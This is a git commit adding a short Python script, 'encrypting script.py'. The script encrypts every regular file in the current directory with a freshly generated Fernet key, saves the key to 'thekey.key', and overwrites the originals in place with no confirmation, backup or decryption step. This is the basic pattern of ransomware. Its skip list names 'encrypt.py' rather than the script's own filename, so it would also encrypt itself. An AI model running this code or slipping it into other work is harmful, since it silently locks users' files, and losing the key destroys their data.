ae98dc44e989526f9c1b31df80ab42ecb1d1dd40
HeDaGi <151563977+nath162@users.noreply.github.com>
2024-08-14 12:51:21 +0200

    Add files via upload

---
+++ encrypting script.py
@@ -0,0 +1,23 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+        if file == "encrypt.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+key = Fernet.generate_key()
+
+with open("thekey.key","wb") as thekey:
+        thekey.write(key)
+
+for file in files:
+        with open(file,"rb") as thefile:
+                content = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(content)
+        
+        with open(file , "wb") as thefile:
+                thefile.write(contents_encrypted)
